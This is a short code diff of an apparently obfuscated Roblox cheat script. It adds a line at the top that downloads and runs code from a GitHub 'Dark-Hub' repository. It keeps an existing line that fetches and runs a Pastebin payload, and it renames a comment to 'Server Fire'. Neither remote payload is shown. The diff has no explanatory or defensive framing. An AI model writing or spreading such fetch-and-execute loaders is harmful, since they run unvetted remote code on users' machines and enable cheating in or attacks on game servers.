@@ -1,9 +1,11 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Entoy77/Dark-Hub/main/loadstring/Message/buildmsg.txt',true))()
+
 --[[
     Synapse Xen v1.1.2 by Synapse GP
     VM Hash: 4f13a4c6050cbd75e033fb3721eba0e3b713eb85ee7ee937d5a99790e1515dfc
 ]]
 
--- Piss off ELITE
+-- Server Fire
 loadstring(game:HttpGet("https://pastebin.com/raw/xfKtNZFm", true))()
 
 -- SHOWCASE VIDEO (Mine): https://www.youtube.com/watch?v=xciSvbUXsUo
